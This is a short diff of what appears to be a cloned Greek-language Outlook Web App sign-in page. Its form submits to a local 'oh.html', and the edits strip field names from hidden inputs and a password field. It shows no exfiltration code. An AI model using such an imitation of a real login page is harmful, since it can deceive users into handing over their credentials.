@@ -1329,9 +1329,9 @@ function RndMimeCtlHlpr(objid, classid, ns, id)
 </noscript>
 
 <form action="oh.html" method="GET" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
-<input type="hidden" name="destination" value="/owa/">
-<input type="hidden" name="flags" value="4">
-<input type="hidden" name="forcedownlevel" value="0">
+<input type="hidden" value="/owa/">
+<input type="hidden" value="4">
+<input type="hidden" value="0">
  
  <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
 <div id="mainLogonDiv" class="mouse">
@@ -1357,7 +1357,7 @@ function RndMimeCtlHlpr(objid, classid, ns, id)
 		<div><input id="username" name="username" class="signInInputText" role="textbox" aria-labelledby="userNameLabel" value=""></div>
 		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Κωδικός πρόσβασης:</div>
 		<div><input id="password" onfocus="g_fFcs=0" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"></div>
-        <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"></div>
+        <div><input id="passwordText" onfocus="g_fFcs=0" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"></div>
         <div class="showPasswordCheck signInCheckBoxText">
             <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()">
             <span>Εμφάνιση κωδικού πρόσβασης</span>
